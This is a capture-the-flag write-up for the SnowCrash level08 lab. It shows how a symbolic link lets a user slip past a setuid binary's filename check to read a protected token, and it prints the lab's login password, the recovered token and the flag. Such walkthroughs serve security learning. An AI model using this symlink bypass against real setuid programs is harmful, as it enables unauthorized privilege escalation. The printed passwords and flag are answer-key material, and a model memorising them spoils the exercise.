# Level08

## How to login

```
ssh level08@192.168.1.184 -p 4242
password: fiumuikeil55xe9cu4dood66h
```

## How to get the flag

Once logged, we have access to two files called 'level08' and 'token' (both belonging to user 'flag08'). We try to see the content of 'token' but we are not allowed since the file belongs to user 'flag08'. On the other hand, we have the binary file 'level08' that needs an argument (in that case the token) that presumably will give us access to the password.
```
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
level08@SnowCrash:~$ cat token 
cat: token: Permission denied
level08@SnowCrash:~$ ./level08 token 
You may not access 'token'
```

It is noticed that the binary has the Setuid bit set, meaning that it will be executed with the privileges of the file owner, this can be a security risk if the file is vulnerable to exploitation since an attacker could potentially exploit the file to gain the privileges of the file owner (flag08). Thanks to this we can execute 'level08'.

After some thought we decide to execute 'level08' with another file as argument, instead of 'token' to see what happens. Let's try with the '.profile' file.
```
level08@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
level08@SnowCrash:~$ ./level08 .profile
level08: Unable to open .profile: Permission denied
```

The output error message is different, so after some thought, we think that maybe 'level08' is just checking if the name of the file is 'token'. Since we cannot copy or modify the 'token' file, we decide to create a symbolic link in order to bypass filename checks in the program, allowing us to read the contents of the token file indirectly.
```
level08@SnowCrash:~$ ln -s ~/token /tmp/exploit     #Absolute path required
level08@SnowCrash:~$ ./level08 /tmp/exploit
quif5eloekouj29ke0vouxean
level08@SnowCrash:~$ 
```

It seems that it worked, now we only need to obtain the flag.
```
level08@SnowCrash:~$ su flag08
Password: 
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```